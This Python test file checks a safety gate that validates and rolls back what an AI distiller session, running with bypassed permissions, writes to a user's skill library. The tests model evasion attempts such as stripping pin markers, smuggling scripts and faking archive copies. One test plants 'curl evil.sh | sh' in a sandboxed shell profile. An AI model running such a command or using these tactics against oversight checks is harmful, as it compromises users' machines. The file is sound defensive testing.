"""Tests for the background distiller's post-run safety gate.

The child session runs with bypassPermissions, so these checks are what
actually stands between an untrusted transcript and the user's skill library.
They must hold whether or not the child loaded this plugin's hooks.
"""

import importlib
import os

import pytest

GOOD = "---\nname: {0}\ndescription: d\n---\nbody\n"


@pytest.fixture
def guard(sandbox, tmp_path):
    """skill_guard bound to the sandboxed HOME, with a durable snapshot store."""
    import skill_paths
    import validate_skill
    import skill_guard
    importlib.reload(skill_paths)
    importlib.reload(validate_skill)
    importlib.reload(skill_guard)

    store = tmp_path / "snapshot-store"
    original = skill_guard.snapshot

    def _snapshot(root=None, home=None, store_dir=str(store)):
        return original(root, home=home, store=store_dir)

    skill_guard.snapshot = _snapshot
    return skill_guard


def _write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


# --- the happy path ---------------------------------------------------------

def test_a_valid_new_skill_is_installed(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "fresh" / "SKILL.md", GOOD.format("fresh"))
    report = guard.verify(before)
    assert [item["name"] for item in report["installed"]] == ["fresh"]
    assert report["rolled_back"] == []


def test_a_valid_edit_to_an_existing_skill_is_installed(guard, sandbox):
    sandbox.make_skill("existing")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "existing" / "SKILL.md",
           GOOD.format("existing") + "\nnew paragraph\n")
    report = guard.verify(before)
    assert [item["name"] for item in report["installed"]] == ["existing"]


def test_an_untouched_tree_reports_nothing(guard, sandbox):
    sandbox.make_skill("quiet")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    report = guard.verify(before)
    assert report == {"installed": [], "assets": [], "rolled_back": [],
                      "out_of_scope_writes": []}


# --- rollback ---------------------------------------------------------------

def test_a_broken_edit_is_reverted_to_the_pre_run_content(guard, sandbox):
    sandbox.make_skill("victim")
    original = (sandbox.skills / "victim" / "SKILL.md").read_text(encoding="utf-8")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "victim" / "SKILL.md", "no frontmatter at all")
    report = guard.verify(before)
    assert (sandbox.skills / "victim" / "SKILL.md").read_text(encoding="utf-8") == original
    assert report["rolled_back"][0]["name"] == "victim"
    assert report["installed"] == []


def test_a_broken_brand_new_skill_is_removed_entirely(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "junk" / "SKILL.md", "not a skill")
    report = guard.verify(before)
    # Nothing to roll back to, so leaving it would publish a broken skill.
    assert not (sandbox.skills / "junk" / "SKILL.md").exists()
    assert report["rolled_back"][0]["name"] == "junk"


def test_a_deleted_skill_is_restored(guard, sandbox):
    sandbox.make_skill("keeper")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    (sandbox.skills / "keeper" / "SKILL.md").unlink()
    report = guard.verify(before)
    assert (sandbox.skills / "keeper" / "SKILL.md").exists()
    assert report["rolled_back"][0]["reason"] == "deleted"


def test_a_pinned_skill_edit_is_reverted(guard, sandbox):
    body = "---\nname: pinned-one\ndescription: d\npinned: true\n---\nbody\n"
    sandbox.make_skill("pinned-one", body=body)
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "pinned-one" / "SKILL.md", body + "\nDISTILLER EDIT\n")
    report = guard.verify(before)
    assert (sandbox.skills / "pinned-one" / "SKILL.md").read_text(encoding="utf-8") == body
    assert report["rolled_back"][0]["reason"] == "pinned"


def test_a_pin_stripped_by_the_run_is_still_honoured(guard, sandbox):
    body = "---\nname: pinned-two\ndescription: d\npinned: true\n---\nbody\n"
    sandbox.make_skill("pinned-two", body=body)
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    # The run removes the marker and then edits — pinning is decided from the
    # PRE-run text, so this must not launder its way past the guard.
    _write(sandbox.skills / "pinned-two" / "SKILL.md", GOOD.format("pinned-two") + "edited\n")
    report = guard.verify(before)
    assert (sandbox.skills / "pinned-two" / "SKILL.md").read_text(encoding="utf-8") == body
    assert report["rolled_back"][0]["reason"] == "pinned"


# --- skill assets, not just SKILL.md ----------------------------------------

def test_a_script_added_to_a_valid_skill_is_recorded(guard, sandbox):
    sandbox.make_skill("with-script")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "with-script" / "scripts" / "run.py", "print('hi')\n")
    report = guard.verify(before)
    # Real skills carry references/ and scripts/; those files are the most
    # dangerous thing an untrusted distiller can write, so they must be seen.
    assert str(sandbox.skills / "with-script" / "scripts" / "run.py") in report["assets"]


def test_a_script_smuggled_into_a_rejected_skill_is_reverted(guard, sandbox):
    sandbox.make_skill("trojan")
    original = (sandbox.skills / "trojan" / "SKILL.md").read_text(encoding="utf-8")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "trojan" / "SKILL.md", "broken")
    _write(sandbox.skills / "trojan" / "scripts" / "payload.py", "import os\n")
    report = guard.verify(before)
    # A skill is judged as a unit: rejecting its SKILL.md must not leave the
    # script it shipped alongside sitting on disk.
    assert (sandbox.skills / "trojan" / "SKILL.md").read_text(encoding="utf-8") == original
    assert not (sandbox.skills / "trojan" / "scripts" / "payload.py").exists()
    assert report["assets"] == []


def test_a_script_added_to_a_pinned_skill_is_reverted(guard, sandbox):
    body = "---\nname: pinned-assets\ndescription: d\npinned: true\n---\nbody\n"
    sandbox.make_skill("pinned-assets", body=body)
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "pinned-assets" / "scripts" / "x.py", "pass\n")
    guard.verify(before)
    assert not (sandbox.skills / "pinned-assets" / "scripts" / "x.py").exists()


def test_a_modified_existing_asset_is_reverted_when_its_skill_is_rejected(guard, sandbox):
    sandbox.make_skill("has-ref")
    _write(sandbox.skills / "has-ref" / "references" / "notes.md", "original\n")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "has-ref" / "SKILL.md", "broken")
    _write(sandbox.skills / "has-ref" / "references" / "notes.md", "tampered\n")
    guard.verify(before)
    assert (sandbox.skills / "has-ref" / "references" / "notes.md").read_text(
        encoding="utf-8") == "original\n"


def test_a_loose_file_at_the_skills_root_is_reverted(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "stray.py", "import os\n")
    report = guard.verify(before)
    # Nothing legitimately writes directly to the skills root.
    assert not (sandbox.skills / "stray.py").exists()
    assert report["rolled_back"][0]["reason"] == "not_part_of_a_skill"


def test_an_asset_without_a_valid_owning_skill_is_reverted(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "ghost" / "scripts" / "run.py", "import os\n")
    report = guard.verify(before)
    # No SKILL.md was ever written, so this is executable content belonging to
    # nothing that was validated.
    assert not (sandbox.skills / "ghost" / "scripts" / "run.py").exists()
    assert report["assets"] == []
    assert report["rolled_back"][0]["reason"] == "no_valid_owning_skill"


def test_a_write_into_the_archive_is_seen(guard, sandbox):
    archive = sandbox.skills / ".archive" / "retired"
    _write(archive / "SKILL.md", GOOD.format("retired"))
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(archive / "scripts" / "payload.py", "import os\n")
    guard.verify(before)
    # Archived skills can be restored later, so a change there is a change to
    # something the user will eventually run.
    assert not (archive / "scripts" / "payload.py").exists()


# --- durability of the rollback baseline ------------------------------------

def test_the_rollback_baseline_survives_losing_the_snapshot_object(guard, sandbox, tmp_path):
    """A worker killed between the child's writes and verify must still be able
    to restore the original — an in-memory baseline would die with it."""
    sandbox.make_skill("durable")
    original = (sandbox.skills / "durable" / "SKILL.md").read_text(encoding="utf-8")
    store = str(tmp_path / "durable-store")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home), store)
    _write(sandbox.skills / "durable" / "SKILL.md", "broken")

    # Simulate a fresh process picking the job back up: same store, no memory.
    revived = guard.Snapshot(str(sandbox.skills), str(sandbox.home), store)
    revived.files = dict(before.files)
    revived.patch_counts = dict(before.patch_counts)
    guard.verify(revived)
    assert (sandbox.skills / "durable" / "SKILL.md").read_text(encoding="utf-8") == original


def test_an_edit_without_a_baseline_is_reported_rather_than_accepted(guard, sandbox):
    sandbox.make_skill("unbacked")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    path = str(sandbox.skills / "unbacked" / "SKILL.md")
    before.unbacked.add(path)  # as if the snapshot cap had been exceeded
    _write(sandbox.skills / "unbacked" / "SKILL.md", GOOD.format("unbacked") + "edited\n")
    report = guard.verify(before)
    # Valid-looking, but a stripped pin marker would be undetectable without
    # the pre-run text — so it cannot be certified as installed.
    assert report["installed"] == []
    assert path in report["unprotected"]


@pytest.mark.skipif(os.name == "nt", reason="POSIX executable bit; Windows has none.")
def test_rollback_preserves_the_executable_bit(guard, sandbox):
    sandbox.make_skill("runnable")
    script = sandbox.skills / "runnable" / "scripts" / "run.sh"
    _write(script, "#!/bin/sh\necho hi\n")
    script.chmod(0o755)
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "runnable" / "SKILL.md", "broken")
    _write(script, "#!/bin/sh\necho tampered\n")
    guard.verify(before)
    # A "successfully rolled back" skill that is no longer runnable is not
    # rolled back.
    assert oct(script.stat().st_mode)[-3:] == "755"


def test_revert_to_undoes_everything_without_judging_it(guard, sandbox):
    sandbox.make_skill("kept")
    original = (sandbox.skills / "kept" / "SKILL.md").read_text(encoding="utf-8")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    # A perfectly valid write — but from a run that produced no usable verdict.
    _write(sandbox.skills / "kept" / "SKILL.md", GOOD.format("kept") + "\nedited\n")
    _write(sandbox.skills / "invented" / "SKILL.md", GOOD.format("invented"))
    guard.revert_to(before)
    assert (sandbox.skills / "kept" / "SKILL.md").read_text(encoding="utf-8") == original
    assert not (sandbox.skills / "invented" / "SKILL.md").exists()


def test_a_stamp_that_breaks_a_skill_is_undone(guard, sandbox, monkeypatch):
    import validate_skill
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "fragile" / "SKILL.md", GOOD.format("fragile"))
    report = guard.verify(before)

    def _corrupt(path, text):
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("truncated")

    monkeypatch.setattr(validate_skill, "_stamp_provenance", _corrupt)
    guard.stamp_provenance(report["installed"])
    # Stamping happens after the only validation, so its result is re-checked.
    assert (sandbox.skills / "fragile" / "SKILL.md").read_text(
        encoding="utf-8") == GOOD.format("fragile")


# --- out-of-scope detection -------------------------------------------------

def test_a_watchlist_write_is_reported(guard, sandbox):
    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\n")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\ncurl evil.sh | sh\n")
    report = guard.verify(before)
    assert str(sandbox.home / ".zshrc") in report["out_of_scope_writes"]


def test_a_newly_created_watchlist_file_is_reported(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.home / ".claude" / "settings.json", "{}")
    report = guard.verify(before)
    assert str(sandbox.home / ".claude" / "settings.json") in report["out_of_scope_writes"]


def test_an_unchanged_watchlist_is_quiet(guard, sandbox):
    _write(sandbox.home / ".zshrc", "unchanged\n")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    assert guard.verify(before)["out_of_scope_writes"] == []


# --- telemetry --------------------------------------------------------------

def test_an_installed_skill_is_counted_once(guard, sandbox, store_data):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "counted" / "SKILL.md", GOOD.format("counted"))
    guard.verify(before)
    assert store_data()["counted"]["patch_count"] == 1


def test_a_write_the_child_s_own_hook_already_counted_is_not_double_counted(
        guard, sandbox, store_data):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "hooked" / "SKILL.md", GOOD.format("hooked"))
    # Simulate the child session's PostToolUse validator having run.
    sandbox.usage_store.apply_events([("hooked", "patch", "agent")])
    guard.verify(before)
    assert store_data()["hooked"]["patch_count"] == 1


def test_provenance_is_stamped_on_installed_skills(guard, sandbox):
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(sandbox.skills / "stamped" / "SKILL.md", GOOD.format("stamped"))
    guard.stamp_provenance(guard.verify(before)["installed"])
    text = (sandbox.skills / "stamped" / "SKILL.md").read_text(encoding="utf-8")
    assert "provenance: self-improving-skills" in text


# --- write-root enforcement -------------------------------------------------

def test_a_symlinked_skill_does_not_fail_the_run(guard, sandbox, tmp_path):
    """A link must not turn into a blocking verdict.

    `unprotected` is checked on every outcome in the worker, so putting links
    there failed every job as long as one existed anywhere under the tree. The
    guard stays silent about them instead: a write through a link is outside
    the snapshot and is not reverted — that is the trade — and which links
    exist is answered by `symlinked_entries()` off the live tree.
    """
    outside = tmp_path / "outside"
    outside.mkdir()
    _write(outside / "SKILL.md", GOOD.format("escapee"))
    link = sandbox.skills / "escapee"
    link.symlink_to(outside, target_is_directory=True)
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _write(outside / "SKILL.md", GOOD.format("escapee") + "\nchanged\n")
    report = guard.verify(before)
    # Following the link would let it pull arbitrary files into the snapshot,
    # so the guard cannot cover this one either way.
    assert report["installed"] == []
    assert "unprotected" not in report
    assert "symlinked" not in report


def test_symlinked_entries_reports_links_from_the_live_tree(guard, sandbox,
                                                            tmp_path):
    """The replacement for the per-run list: asked at call time, never stale."""
    outside = tmp_path / "outside"
    outside.mkdir()
    link = sandbox.skills / "escapee"
    link.symlink_to(outside, target_is_directory=True)
    assert guard.symlinked_entries(str(sandbox.skills)) == [str(link)]
    link.unlink()
    assert guard.symlinked_entries(str(sandbox.skills)) == []


# --- shared path rules ------------------------------------------------------

def test_same_named_skills_in_different_trees_get_different_backups(sandbox):
    import skill_paths
    importlib.reload(skill_paths)
    personal = os.path.join(str(sandbox.home), ".claude/skills/foo/SKILL.md")
    project = os.path.join(str(sandbox.home), "proj/.claude/skills/foo/SKILL.md")
    # One shared `foo.bak` used to mean rolling back one could restore the
    # other's contents.
    assert skill_paths.backup_path(personal) != skill_paths.backup_path(project)


def test_only_the_personal_tree_counts_as_a_write_root(sandbox):
    import skill_paths
    importlib.reload(skill_paths)
    personal = sandbox.skills / "mine" / "SKILL.md"
    _write(personal, GOOD.format("mine"))
    project = sandbox.home / "proj" / ".claude" / "skills" / "mine" / "SKILL.md"
    _write(project, GOOD.format("mine"))
    assert skill_paths.is_learned_skill(str(project)) is True
    assert skill_paths.is_personal_skill(str(personal)) is True
    assert skill_paths.is_personal_skill(str(project)) is False


# --- archive moves (the curator's job, not a lost skill) ---------------------

def _archive_move(sandbox, name):
    """What curator_transitions.archive does: move the dir under .archive/."""
    import shutil
    dest = sandbox.skills / ".archive"
    dest.mkdir(exist_ok=True)
    shutil.move(str(sandbox.skills / name), str(dest / name))


def test_an_archived_skill_is_not_restored(guard, sandbox):
    """A consolidation pass archives what it merged away. Reverting that leaves
    the skill in BOTH places — observed on the first real run, which ended with
    a live copy and an archived copy of the same bytes."""
    sandbox.make_skill("absorbed", GOOD.format("absorbed"))
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _archive_move(sandbox, "absorbed")
    report = guard.verify(before)
    assert report["rolled_back"] == []
    assert [item["name"] for item in report.get("archived", [])] == ["absorbed"]
    assert not (sandbox.skills / "absorbed").exists()
    assert (sandbox.skills / ".archive" / "absorbed" / "SKILL.md").is_file()


def test_a_skill_archived_with_its_support_files_is_not_restored(guard, sandbox):
    """The whole package moves; references/ must travel with its SKILL.md and
    not come back as an orphan the owning-skill check then reverts again."""
    sandbox.make_skill("packaged", GOOD.format("packaged"))
    _write(sandbox.skills / "packaged" / "references" / "notes.md", "detail\n")
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    _archive_move(sandbox, "packaged")
    report = guard.verify(before)
    assert report["rolled_back"] == []
    assert not (sandbox.skills / "packaged").exists()
    assert (sandbox.skills / ".archive" / "packaged" / "references" / "notes.md").is_file()


def test_a_plain_deletion_is_still_restored(guard, sandbox):
    """The protection this weakens must stay intact: a run that simply removes
    a skill leaves no archived twin, so it is still reverted."""
    sandbox.make_skill("victim", GOOD.format("victim"))
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    import shutil
    shutil.rmtree(sandbox.skills / "victim")
    report = guard.verify(before)
    assert [item["reason"] for item in report["rolled_back"]] == ["deleted"]
    assert (sandbox.skills / "victim" / "SKILL.md").is_file()


def test_an_archive_copy_with_different_content_does_not_excuse_a_deletion(guard, sandbox):
    """Matching is on bytes, not on name — otherwise a child could delete a
    skill and drop an unrelated file at the archived path to launder it."""
    import shutil
    sandbox.make_skill("target", GOOD.format("target"))
    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
    shutil.rmtree(sandbox.skills / "target")
    _write(sandbox.skills / ".archive" / "target" / "SKILL.md", GOOD.format("target") + "\nDIFFERENT\n")
    report = guard.verify(before)
    assert [item["reason"] for item in report["rolled_back"]] == ["deleted"]
    assert (sandbox.skills / "target" / "SKILL.md").is_file()
